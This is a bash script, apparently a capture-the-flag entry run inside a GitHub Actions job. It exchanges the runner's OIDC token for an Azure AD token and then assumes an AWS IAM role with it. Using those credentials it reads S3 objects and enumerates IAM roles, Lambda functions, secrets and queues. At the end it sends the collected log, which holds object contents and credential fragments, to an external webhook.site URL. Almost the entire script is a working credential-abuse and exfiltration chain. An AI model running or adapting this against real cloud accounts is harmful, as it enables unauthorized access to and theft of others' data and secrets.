#!/usr/bin/env bash
# CTF DF26 v16: GitHub OIDC -> AAD v1 token (iss sts.windows.net) -> AWS STS
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID
WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
ROLE=arn:aws:iam::890742561357:role/tbl-platform-ci
LOG=/tmp/awsl2; : > "$LOG"
say(){ echo "$@" | tee -a "$LOG"; }
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
say "github oidc ${#OIDC}"
AAD=""
for EP in "https://login.microsoftonline.com/$T/oauth2/v1.0/token" "https://login.microsoftonline.com/$T/oauth2/token"; do
  AAD=$(curl -s -m 20 -X POST "$EP" \
    --data-urlencode grant_type=client_credentials \
    --data-urlencode "client_id=$C" \
    --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=$OIDC" \
    --data-urlencode "resource=api://AzureADTokenExchange" | jq -r '.access_token // empty')
  say "EP=$EP aad_len=${#AAD}"
  [ ${#AAD} -gt 100 ] && break
done
if [ ${#AAD} -gt 100 ]; then
  python3 - "$AAD" <<'PY' 2>/dev/null | tee -a "$LOG"
import base64,json,sys
p=sys.argv[1].split('.')[1]; p+='='*((-len(p))%4)
c=json.loads(base64.urlsafe_b64decode(p))
print({k:c.get(k) for k in ('iss','aud','appid','oid','idtyp','tid')})
PY
  RESP=$(curl -s -m 25 -X POST "https://sts.amazonaws.com/" \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=$ROLE" \
    --data-urlencode "RoleSessionName=ctf-$(date +%s)" \
    --data-urlencode "WebIdentityToken=$AAD")
  say "STS:"; echo "$RESP" | head -c 1200 | tee -a "$LOG"; echo
  export AWS_ACCESS_KEY_ID=$(echo "$RESP" | grep -oP '(?<=<AccessKeyId>)[^<]+')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RESP" | grep -oP '(?<=<SecretAccessKey>)[^<]+')
  export AWS_SESSION_TOKEN=$(echo "$RESP" | grep -oP '(?<=<SessionToken>)[^<]+')
  say "ak=${AWS_ACCESS_KEY_ID:0:6}"
  if [ ${#AWS_ACCESS_KEY_ID} -gt 10 ]; then
python3 <<'PY' 2>&1 | tee -a "$LOG"
import os, json
import boto3
sess = boto3.session.Session(
    aws_access_key_id=os.environ["AWS_ACCESS_KEY_ID"],
    aws_secret_access_key=os.environ["AWS_SECRET_ACCESS_KEY"],
    aws_session_token=os.environ["AWS_SESSION_TOKEN"],
    region_name="us-east-1")
st = sess.client("sts")
print("CALLER", st.get_caller_identity())
s3 = sess.client("s3")
bks = s3.list_buckets()["Buckets"]
print("BUCKETS", [b["Name"] for b in bks])
for b in bks:
    n = b["Name"]
    try:
        objs = s3.get_paginator("list_objects_v2").paginate(Bucket=n)
        cnt = 0
        for page in objs:
            for o in page.get("Contents", [])[:100]:
                k = o["Key"]
                print(f"OBJ {n}/{k} size={o['Size']}")
                if o["Size"] < 2000000:
                    d = s3.get_object(Bucket=n, Key=k)["Body"].read()
                    txt = d.decode("utf-8", "replace")
                    if "DF26{" in txt:
                        import re
                        print("FLAG_HIT", n, k, re.findall(r"DF26\{[^}]*\}", txt))
                    else:
                        print("HEAD", n, k, txt[:200].replace(chr(10), " "))
                    cnt += 1
                    if cnt > 60: break
            if cnt > 60: break
    except Exception as e:
        print("BERR", n, repr(e)[:200])
for svc in ["iam", "lambda", "dynamodb", "secretsmanager", "sns", "sqs"]:
    try:
        cl = sess.client(svc)
        if svc == "iam": r = cl.list_roles()["Roles"]; print("IAM", [x["RoleName"] for x in r])
        if svc == "lambda": r = cl.list_functions()["Functions"]; print("LAMBDA", [x["FunctionName"] for x in r])
        if svc == "dynamodb": r = cl.list_tables(); print("DDB", r["TableNames"])
        if svc == "secretsmanager": r = cl.list_secrets(); print("SM", [x["Name"] for x in r["SecretList"]])
        if svc == "sns": r = cl.list_topics(); print("SNS", [t["TopicArn"] for t in r["Topics"]])
        if svc == "sqs": r = cl.list_queues(); print("SQS", r.get("QueueUrls"))
    except Exception as e:
        print("SVCERR", svc, repr(e)[:120])
PY
  else
    say "no AWS creds"
  fi
fi
echo "===DONE-V16===" >> "$LOG"
curl -s -X POST --data-urlencode log@"$LOG" "$WB/v16-aws-$GITHUB_RUN_ID" >/dev/null
tail -c 1200 "$LOG"
